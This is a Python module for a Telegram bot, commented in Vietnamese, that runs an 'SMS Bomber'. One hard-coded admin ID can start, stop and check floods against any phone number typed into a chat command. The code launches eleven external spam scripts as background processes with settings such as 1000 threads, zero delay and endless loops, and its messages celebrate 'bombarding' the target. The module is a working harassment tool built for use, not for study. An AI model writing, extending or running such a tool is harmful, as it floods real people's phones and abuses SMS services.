import subprocess
import threading
import os
import time
import random
from datetime import datetime
from telebot.types import Message
from main import bot

# ADMIN ID - CHỈ ID NÀY MỚI ĐƯỢC DÙNG LỆNH
ADMIN_ID = 8257386163

# Biến toàn cục
running_processes = []
is_attacking = False
attack_start_time = None
attack_target = ""
attack_stats = {"scripts_started": 0, "scripts_completed": 0}

# Hiệu ứng loading
def loading_effect():
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    return random.choice(frames)

# Hiệu ứng thanh tiến trình
def progress_bar(percentage, length=20):
    filled = int(length * percentage / 100)
    empty = length - filled
    bar = "█" * filled + "░" * empty
    return f"[{bar}] {percentage}%"

# Kiểm tra admin
def is_admin(user_id):
    return user_id == ADMIN_ID

# Hàm tạo hiệu ứng đẹp
def create_effect_message(action, phone=None, status=None):
    effects = {
        "start": [
            "⚡ KHỞI ĐỘNG HỆ THỐNG BOMBER ⚡",
            "🔥 KÍCH HOẠT TẤN CÔNG ĐA TẦNG 🔥",
            "🚀 PHÓNG PHÁO HOA SỐ LIÊN TỤC 🚀",
            "💣 KÍCH NỔ CHUỖI BOM SMS 💣"
        ],
        "running": [
            "🎯 MỤC TIÊU ĐÃ BẮN TRÚNG 🎯",
            "📱 ĐANG OANH TẠC SỐ ĐIỆN THOẠI 📱",
            "⚡ DÒNG SMS ĐANG TUÔN TRÀO ⚡",
            "💥 HỆ THỐNG ĐANG BÃO HOÀ 💥"
        ],
        "stop": [
            "🛑 HỆ THỐNG ĐÃ DỪNG KHẨN CẤP 🛑",
            "✅ ĐÃ NGẮT KẾT NỐI TẤT CẢ ✅",
            "🌀 DỪNG TẤT CẢ TIẾN TRÌNH 🌀",
            "⚡ HỆ THỐNG ĐÃ TẮT AN TOÀN ⚡"
        ]
    }
    
    current_time = datetime.now().strftime("%H:%M:%S")
    effect = random.choice(effects.get(action, ["⚡"]))
    
    if action == "start" and phone:
        return (
            f"═══════════════════════════\n"
            f"🚀 <b>SMS BOMBER PRO v2.0</b> 🚀\n"
            f"═══════════════════════════\n"
            f"🎯 <b>Mục tiêu:</b> <code>{phone}</code>\n"
            f"⏰ <b>Thời gian:</b> {current_time}\n"
            f"⚡ <b>Trạng thái:</b> ĐANG KHỞI ĐỘNG\n"
            f"═══════════════════════════\n"
            f"{effect}\n"
            f"═══════════════════════════\n"
            f"💣 <i>Hệ thống đang chuẩn bị tấn công...</i>"
        )
    elif action == "running" and phone:
        elapsed = int(time.time() - attack_start_time) if attack_start_time else 0
        stats = f"{attack_stats['scripts_started']}/{len(sms_scripts)} script"
        
        return (
            f"═══════════════════════════\n"
            f"💥 <b>SMS BOMBER ĐANG CHẠY</b> 💥\n"
            f"═══════════════════════════\n"
            f"🎯 <b>Mục tiêu:</b> <code>{phone}</code>\n"
            f"⏱️ <b>Thời gian:</b> {elapsed}s\n"
            f"📊 <b>Tiến trình:</b> {stats}\n"
            f"⚡ <b>Trạng thái:</b> ĐANG TẤN CÔNG\n"
            f"═══════════════════════════\n"
            f"{effect}\n"
            f"{progress_bar(random.randint(75, 95))}\n"
            f"═══════════════════════════\n"
            f"🛑 Dừng: <code>/stopspmsms</code>"
        )
    elif action == "stop":
        return (
            f"═══════════════════════════\n"
            f"🛑 <b>SMS BOMBER ĐÃ DỪNG</b> 🛑\n"
            f"═══════════════════════════\n"
            f"⏰ <b>Thời gian:</b> {current_time}\n"
            f"📊 <b>Hoàn thành:</b> {attack_stats['scripts_completed']} script\n"
            f"⚡ <b>Trạng thái:</b> ĐÃ DỪNG\n"
            f"═══════════════════════════\n"
            f"{effect}\n"
            f"{progress_bar(0)}\n"
            f"═══════════════════════════\n"
            f"✅ <i>Hệ thống đã dừng an toàn</i>"
        )
    
    return effect

# Danh sách script SMS - ĐÃ FIX LỖI THIẾU DẤU PHẨY
sms_scripts = [
    {'file': 'smsv10.py', 'args': ['0', '0', '--threads', '1000'], 'name': 'SMS V10 - Super Attack'},
    {'file': 'smsv4.py', 'args': ['999999999', '--threads', '500', '--delay', '0', '0'], 'name': 'SMS V4 - Multi Thread'},
    {'file': 'smsv9.py', 'args': [], 'name': 'SMS V9 - Basic Bomb'},
    {'file': 'smsv3.py', 'args': ['100', 'infinite'], 'name': 'SMS V3 - Infinite Loop'},
    {'file': 'smsv5.py', 'args': ['-1'], 'name': 'SMS V5 - Ultimate'},
    {'file': 'smsv7.py', 'args': ['--infinite'], 'name': 'SMS V7 - Endless'},
    {'file': 'smsv2.py', 'args': [], 'name': 'SMS V2 - Classic'},
    {'file': 'smsv6.py', 'args': [], 'name': 'SMS V6 - Power'},
    {'file': 'smsv11.py', 'args': ['999999999'], 'name': 'SMS V11 - Mega Attack'},
    {'file': 'sms.py', 'args': [], 'name': 'SMS Standard - Default'},
    {'file': 'smsv12.py', 'args': [], 'name': 'SMS V12 - Extra Power'}  # ĐÃ THÊM DẤU PHẨY Ở ĐÂY
]

@bot.message_handler(commands=['spmsms'])
def sms_attack_command(message: Message):
    global is_attacking, running_processes, attack_start_time, attack_target, attack_stats
    
    # Kiểm tra admin
    if not is_admin(message.from_user.id):
        bot.reply_to(message, 
            "⛔ <b>ACCESS DENIED!</b>\n"
            "═══════════════════════════\n"
            "🚫 Bạn không có quyền sử dụng lệnh này!\n"
            "🔒 Chỉ Admin mới được phép kích hoạt hệ thống\n"
            "═══════════════════════════", 
            parse_mode="HTML"
        )
        return
    
    if is_attacking:
        elapsed = int(time.time() - attack_start_time) if attack_start_time else 0
        bot.reply_to(message, 
            f"⚠️ <b>HỆ THỐNG ĐANG BẬN!</b>\n"
            f"═══════════════════════════\n"
            f"🎯 Đang tấn công: <code>{attack_target}</code>\n"
            f"⏱️ Đã chạy: {elapsed} giây\n"
            f"📊 Script: {attack_stats['scripts_started']}/{len(sms_scripts)}\n"
            f"═══════════════════════════\n"
            f"🛑 Dùng <code>/stopspmsms</code> để dừng trước!",
            parse_mode="HTML"
        )
        return
    
    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message,
            "📱 <b>SMS BOMBER - HƯỚNG DẪN</b>\n"
            "═══════════════════════════\n"
            "⚡ <b>Cách dùng:</b>\n"
            "<code>/spmsms SỐ_ĐIỆN_THOẠI</code>\n\n"
            "📌 <b>Ví dụ:</b>\n"
            "<code>/spmsms 0912345678</code>\n"
            "<code>/spmsms 0987654321</code>\n"
            "═══════════════════════════\n"
            "💣 <i>Bot by Hoang dùng /smsstatus để check thông tin</i>",
            parse_mode="HTML"
        )
        return
    
    phone = command_parts[1].strip()
    
    # Validate số điện thoại
    if not phone.isdigit() or len(phone) < 9 or len(phone) > 11:
        bot.reply_to(message,
            "❌ <b>SỐ ĐIỆN THOẠI KHÔNG HỢP LỆ!</b>\n"
            "═══════════════════════════\n"
            "📱 Số điện thoại phải:\n"
            "• Chỉ chứa số (0-9)\n"
            "• Độ dài: 9-11 ký tự\n"
            "• Không có ký tự đặc biệt\n"
            "═══════════════════════════\n"
            "💡 <i>Ví dụ: 0912345678, 84912345678</i>",
            parse_mode="HTML"
        )
        return
    
    sms_dir = "/home/container/commands/SMS"
    
    if not os.path.exists(sms_dir):
        bot.reply_to(message,
            "❌ <b>THƯ MỤC SMS KHÔNG TỒN TẠI!</b>\n"
            f"═══════════════════════════\n"
            f"📁 Đường dẫn: <code>{sms_dir}</code>\n"
            f"⚠️ Vui lòng kiểm tra thư mục SMS\n"
            f"═══════════════════════════",
            parse_mode="HTML"
        )
        return
    
    # Kiểm tra file script
    missing_files = []
    for script in sms_scripts:
        path = os.path.join(sms_dir, script['file'])
        if not os.path.exists(path):
            missing_files.append(script['file'])
    
    if missing_files:
        missing_list = "\n".join([f"• {f}" for f in missing_files])
        bot.reply_to(message,
            f"❌ <b>THIẾU FILE SCRIPT!</b>\n"
            f"═══════════════════════════\n"
            f"📁 Thiếu {len(missing_files)} file:\n{missing_list}\n"
            f"═══════════════════════════\n"
            f"⚠️ Vui lòng bổ sung file còn thiếu",
            parse_mode="HTML"
        )
        return
    
    # Bắt đầu tấn công
    is_attacking = True
    attack_start_time = time.time()
    attack_target = phone
    attack_stats = {"scripts_started": 0, "scripts_completed": 0}
    running_processes = []
    
    # Gửi thông báo bắt đầu
    start_msg = create_effect_message("start", phone)
    sent_msg = bot.reply_to(message, start_msg, parse_mode="HTML")
    
    # Chạy các script trong thread riêng
    def run_attack():
        global attack_stats
        
        try:
            # Khởi chạy từng script
            for idx, script in enumerate(sms_scripts, 1):
                if not is_attacking:
                    break
                    
                try:
                    path = os.path.join(sms_dir, script['file'])
                    full_args = [phone] + script['args']
                    
                    # Cập nhật tiến trình
                    attack_stats['scripts_started'] = idx
                    
                    # Chạy script
                    process = subprocess.Popen(
                        ['python3', path] + full_args,
                        cwd=sms_dir,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    running_processes.append(process)
                    
                    # Cập nhật thông báo
                    if idx % 2 == 0 or idx == len(sms_scripts):
                        try:
                            elapsed = int(time.time() - attack_start_time)
                            update_msg = (
                                f"⚡ <b>ĐANG KHỞI CHẠY...</b> {loading_effect()}\n"
                                f"═══════════════════════════\n"
                                f"🎯 <b>Mục tiêu:</b> <code>{phone}</code>\n"
                                f"⏱️ <b>Thời gian:</b> {elapsed}s\n"
                                f"📊 <b>Tiến trình:</b> {idx}/{len(sms_scripts)} script\n"
                                f"🔧 <b>Đang chạy:</b> {script['name']}\n"
                                f"═══════════════════════════\n"
                                f"{progress_bar(int(idx * 100 / len(sms_scripts)))}\n"
                                f"═══════════════════════════\n"
                                f"⚡ <i>Hệ thống đang hoạt động ổn định</i>"
                            )
                            bot.edit_message_text(
                                update_msg,
                                sent_msg.chat.id,
                                sent_msg.message_id,
                                parse_mode="HTML"
                            )
                        except:
                            pass
                    
                    # Delay giữa các script
                    time.sleep(random.uniform(0.3, 0.7))
                    
                except Exception as e:
                    print(f"Error running {script['file']}: {e}")
                    continue
            
            # Sau khi khởi chạy xong, gửi thông báo thành công
            if is_attacking:
                attack_stats['scripts_completed'] = len(sms_scripts)
                
                success_msg = create_effect_message("running", phone)
                bot.edit_message_text(
                    success_msg,
                    sent_msg.chat.id,
                    sent_msg.message_id,
                    parse_mode="HTML"
                )
                
                # Gửi thêm thông báo chi tiết
                detail_msg = (
                    f"✅ <b>SMS BOMBER ĐÃ KÍCH HOẠT THÀNH CÔNG!</b>\n"
                    f"═══════════════════════════\n"
                    f"🎯 <b>Mục tiêu:</b> <code>{phone}</code>\n"
                    f"⚡ <b>Số script:</b> {len(sms_scripts)}/11\n"
                    f"🔥 <b>Trạng thái:</b> ĐANG TẤN CÔNG\n"
                    f"⏰ <b>Thời điểm:</b> {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}\n"
                    f"═══════════════════════════\n"
                    f"📊 <b>THỐNG KÊ SCRIPT:</b>\n"
                )
                
                for script in sms_scripts:
                    detail_msg += f"• ✅ {script['name']}\n"
                
                detail_msg += (
                    f"═══════════════════════════\n"
                    f"⚠️ <b>LƯU Ý:</b>\n"
                    f"• Hệ thống đang chạy ngầm\n"
                    f"• Không tắt bot khi đang chạy\n"
                    f"• Dùng <code>/stopspmsms</code> để dừng\n"
                    f"• Dùng <code>/smsstatus</code> để check trạng thái hoạt động\n"
                    f"═══════════════════════════\n"
                    f"💣 <i>Bom SMS đã được triển khai thành công!</i>"
                )
                
                bot.send_message(
                    message.chat.id,
                    detail_msg,
                    parse_mode="HTML"
                )
                
        except Exception as e:
            print(f"Attack thread error: {e}")
    
    # Bắt đầu thread tấn công
    attack_thread = threading.Thread(target=run_attack)
    attack_thread.daemon = True
    attack_thread.start()

@bot.message_handler(commands=['stopspmsms'])
def stop_sms_attack(message: Message):
    global is_attacking, running_processes, attack_stats
    
    # Kiểm tra admin
    if not is_admin(message.from_user.id):
        bot.reply_to(message,
            "⛔ <b>ACCESS DENIED!</b>\n"
            "═══════════════════════════\n"
            "🚫 Bạn không có quyền sử dụng lệnh này!\n"
            "🔒 Chỉ Admin mới được phép điều khiển hệ thống\n"
            "═══════════════════════════",
            parse_mode="HTML"
        )
        return
    
    if not is_attacking:
        bot.reply_to(message,
            "ℹ️ <b>KHÔNG CÓ CUỘC TẤN CÔNG NÀO ĐANG CHẠY</b>\n"
            "═══════════════════════════\n"
            "📊 Hệ thống đang ở trạng thái idle\n"
            "🚀 Dùng <code>/spmsms SỐ_ĐIỆN_THOẠI</code> để bắt đầu\n"
            "═══════════════════════════",
            parse_mode="HTML"
        )
        return
    
    try:
        # Dừng tất cả process
        stopped_count = 0
        failed_count = 0
        
        for process in running_processes:
            try:
                process.terminate()
                time.sleep(0.1)
                if process.poll() is None:
                    process.kill()
                    process.wait()
                stopped_count += 1
            except:
                failed_count += 1
        
        # Reset biến toàn cục
        running_processes.clear()
        is_attacking = False
        
        # Gửi thông báo dừng
        stop_msg = create_effect_message("stop")
        bot.reply_to(message, stop_msg, parse_mode="HTML")
        
        # Gửi thêm thông tin chi tiết
        if attack_start_time:
            elapsed = int(time.time() - attack_start_time)
            detail_msg = (
                f"📊 <b>THỐNG KÊ CUỘC TẤN CÔNG</b>\n"
                f"═══════════════════════════\n"
                f"🎯 <b>Mục tiêu:</b> <code>{attack_target}</code>\n"
                f"⏱️ <b>Thời gian chạy:</b> {elapsed} giây\n"
                f"📈 <b>Script đã chạy:</b> {attack_stats['scripts_completed']}/11\n"
                f"✅ <b>Đã dừng:</b> {stopped_count} process\n"
                f"❌ <b>Lỗi dừng:</b> {failed_count} process\n"
                f"═══════════════════════════\n"
                f"🔄 <b>HỆ THỐNG ĐÃ ĐƯỢC RESET</b>\n"
                f"═══════════════════════════\n"
                f"🚀 Sẵn sàng cho lệnh tấn công tiếp theo!"
            )
            
            bot.send_message(
                message.chat.id,
                detail_msg,
                parse_mode="HTML"
            )
        
    except Exception as e:
        bot.reply_to(message,
            f"❌ <b>LỖI KHI DỪNG HỆ THỐNG!</b>\n"
            f"═══════════════════════════\n"
            f"⚠️ Chi tiết lỗi: {str(e)[:100]}\n"
            f"═══════════════════════════\n"
            f"🔄 Đang reset hệ thống...",
            parse_mode="HTML"
        )
        is_attacking = False
        running_processes.clear()

# Command kiểm tra trạng thái
@bot.message_handler(commands=['smsstatus'])
def sms_status_command(message: Message):
    # Kiểm tra admin
    if not is_admin(message.from_user.id):
        return
    
    if is_attacking and attack_start_time:
        elapsed = int(time.time() - attack_start_time)
        status_msg = (
            f"🔍 <b>TRẠNG THÁI SMS BOMBER</b>\n"
            f"═══════════════════════════\n"
            f"⚡ <b>Trạng thái:</b> ĐANG CHẠY {loading_effect()}\n"
            f"🎯 <b>Mục tiêu:</b> <code>{attack_target}</code>\n"
            f"⏱️ <b>Thời gian:</b> {elapsed} giây\n"
            f"📊 <b>Script:</b> {attack_stats['scripts_started']}/11\n"
            f"🔥 <b>Process:</b> {len(running_processes)} đang chạy\n"
            f"═══════════════════════════\n"
            f"{progress_bar(int(attack_stats['scripts_started'] * 100 / 11))}\n"
            f"═══════════════════════════\n"
            f"🛑 Dừng: <code>/stopspmsms</code>"
        )
    else:
        status_msg = (
            f"🔍 <b>TRẠNG THÁI SMS BOMBER</b>\n"
            f"═══════════════════════════\n"
            f"⚡ <b>Trạng thái:</b> ĐANG TẮT ✅\n"
            f"🎯 <b>Mục tiêu:</b> Chưa thiết lập\n"
            f"📊 <b>Script:</b> 0/11\n"
            f"🔥 <b>Process:</b> 0 đang chạy\n"
            f"═══════════════════════════\n"
            f"{progress_bar(0)}\n"
            f"═══════════════════════════\n"
            f"🚀 Bắt đầu: <code>/spmsms SỐ_ĐIỆN_THOẠI</code>"
        )
    
    bot.reply_to(message, status_msg, parse_mode="HTML")